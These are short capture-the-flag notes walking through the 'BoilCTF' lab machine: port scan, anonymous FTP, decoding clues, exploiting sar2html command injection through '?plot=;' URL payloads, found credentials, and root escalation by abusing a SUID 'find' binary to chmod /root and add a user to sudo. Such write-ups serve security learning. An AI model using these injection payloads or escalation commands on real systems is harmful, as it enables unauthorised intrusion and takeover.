# BoilCTF
```
export ip = 10.10.170.227
```
# SCAN
```
21 ftp
80 http
10000 http
55007 ssh
```

# FTP Enumerate
```
1. ftp allowed Anonymous Login
: Download .info.txt

2. cat .info.txt
  Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
--> rot13 decode
```

# Web Enumerate
```
1. http://{export_ip}/robots.txt

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075

-> ASCII String -> base64 -> Md5 Crack 
-> Result : kidding

2. Interesting Direction 
- /_test (Status: 301) -> sar2html -> https://www.exploit-db.com/exploits/47204
- http://<ipaddr>/index.php?plot=;ls
- http://10.10.23.170/joomla/_test/index.php?plot=;cat log.txt
```
# Gaining Access
```
[Credential] basterd : superduperp@$$

[backup.sh Credential] stoner: superduperp@$$no1knows
```

# Priviliege Escalate
```
: sudo -l
(root) NOPASSWD: /NotThisTime/MessinWithYa

: find / -perm -4000 -type f -exec ls -ld {} \; 2>/dev/null
-r-sr-xr-x 1 root root 232196 Feb  8  2016 /usr/bin/find

: find . -exec chmod -R 777 /root \;
: find . -exec usermod -aG sudo stoner \;

```
